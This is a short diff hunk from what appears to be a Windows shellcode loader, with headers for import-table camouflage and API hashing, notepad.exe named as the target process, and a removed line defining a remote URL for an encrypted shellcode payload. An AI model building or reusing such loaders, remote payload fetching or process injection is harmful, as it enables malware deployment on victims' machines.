@@ -6,7 +6,7 @@
 #include "IATCamo.h"
 #include "Debug.h"
 
-#define PAYLOAD L"https://i-dont-love-daniel.s3.eu-north-1.amazonaws.com/encrypted_shellcode.bin"
+#define PAYLOAD L""
 #define PROC L"notepad.exe"
 
 extern API_HASHING g_Api;
